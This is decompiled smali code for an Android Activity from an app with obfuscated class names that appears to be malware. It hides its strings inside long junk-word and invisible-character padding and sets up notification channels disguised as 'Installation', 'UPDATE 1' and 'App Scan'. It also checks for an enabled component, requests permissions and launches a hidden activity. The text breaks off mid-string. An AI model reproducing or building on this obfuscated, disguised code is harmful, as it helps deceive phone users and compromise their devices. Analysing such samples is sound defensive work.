.class public Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;
.super Landroid/app/Activity;
.source ""


# static fields
.field static b:Landroid/content/Context;


# instance fields
.field private a:Landroid/view/View$OnClickListener;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20$a;

    invoke-direct {v0, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20$a;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;)V

    iput-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->a:Landroid/view/View$OnClickListener;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sget-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->b:Landroid/content/Context;

    if-nez p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->b:Landroid/content/Context;

    :cond_0
    :try_start_0
    const-class p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;

    invoke-static {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->G(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    const/4 v0, 0x1

    if-nez p1, :cond_1

    invoke-virtual {p0, v0}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v0, 0x400

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    const/high16 p1, 0x7f070000

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    sget-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->s:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    const-string v0, "com.ak47.google"

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object p1

    const v0, 0x7f050020

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    invoke-virtual {v0, p1}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    iget-object p1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->a:Landroid/view/View$OnClickListener;

    invoke-virtual {v0, p1}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f050009

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->a:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f050035

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->a:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f050029

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iget-object v0, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->a:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_3

    :cond_1
    invoke-static {}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->g()Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    if-eqz p1, :cond_6

    :try_start_1
    invoke-static {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->h(Landroid/content/Context;)[Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->F(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    if-nez p1, :cond_6

    const/16 p1, 0x1cdf

    :try_start_2
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const/16 v2, 0x1a

    const-string v3, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058"

    const/4 v4, 0x0

    const/4 v5, 0x0

    if-lt v1, v2, :cond_3

    :try_start_3
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Landroid/app/Activity;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_2

    const-string v2, "Instaoffensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058llation"

    invoke-static {v2, v3}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->p(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v2

    if-nez v2, :cond_2

    new-instance v2, Landroid/app/NotificationChannel;

    const-string v6, "Installation"

    const-string v7, "UPDATE 1"

    const/4 v8, 0x3

    invoke-direct {v2, v6, v7, v8}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v6, "App Scan"

    invoke-virtual {v2, v6}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    invoke-virtual {v2, v5, v5}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    invoke-virtual {v1, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    :cond_2
    :try_start_4
    invoke-static {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->f(Landroid/content/Context;I)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    :catch_0
    :cond_3
    :goto_0
    :try_start_5
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const v2, 0x70008000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x17

    if-lt v2, v6, :cond_4

    const/high16 v2, 0xc000000

    invoke-static {p0, v4, v1, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    goto :goto_1

    :cond_4
    move-object v1, v5

    :goto_1
    new-instance v2, Landroidx/core/app/c$b;

    const-string v6, "Instaloffensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058lation"

    invoke-static {v6, v3}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->p(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v2, p0, v6}, Landroidx/core/app/c$b;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v6, 0x106000d

    invoke-virtual {v2, v6}, Landroidx/core/app/c$b;->n(I)Landroidx/core/app/c$b;

    const-string v6, "Completeoffensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u0348u\u1323\u2063\u031f\u2063\u0347\u0325\u0306\u031f\u0322\u0352\u031c\u2063\u0325\u032c\u06e2\u0358\u06e8\u2063\u0334\u2060\u06e4\u0326\u1243\u0324\u0311e\u06e2\u0319\u12ed\u030e\u035d\u2064\u035d\u031d\u2063\u0322\u0338\u1271\u121a\u031b\u0338\u2063\u035a\u12f0\u0337\u2063\u035d\u0327\u0324\u06e3\u0301\u0322\u0345s\u12f0\u0327\u1295\u0304\u034d\u0309\u0313\u0309n\u0324\u0337n\u2060\u0337\u06e8\u1295\u031c\u0329\u0356\u032c\u06e0\u0359\u06e3\u030a\u1273\u035d\u1265\u0354\u033a\u06e1\u033e\u0320\u0342\u2060\u06e2\u0324i\u0327\u0303\u0338\u033a\u0332\u0320\u0311\u031c\u035d\u0318\u0336\u0323\u0309\u0311\u030a\u0333\u0353\u2060\u032eo\u033c\u030an\u033b\u035d\u0312\u2060\u2064\u0311\u06e7\u0318\u035d\u030b\u0333\u034d\u06e0\u06e4\u033c\u0318\u0345\u0319\u0301\u034d\u0334\u12cb\u034a\u031f\u035d\u031a\u0348\u0319\u034d\u030a\u0306\u034e\u0326\u06e0\u0341\u030a\u033c\u0326\u0305\u035d\u030b\u0338\u031a\u2063\u030d\u0318\u06df\u0300i\u0318\u0336\u0319\u2063\u06e0\u0340\u2063\u06e7\u0306\u0300\u2063\u0355\u0317\u0308\u2063\u0318\u0304\u2060\u2060\u0324e\u0323\u031b\u2060\u031c\u0317\u034d\u031f\u0305\u06e4\u120d\u2063\u035a\u032f\u0330\u035d\u0306\u2063\u121d\u0311\u0305\u0337\u2063\u034d\u2064\u0304\u2064\u2060\u1235\u0319\u0311\u0319\u0333\u033f\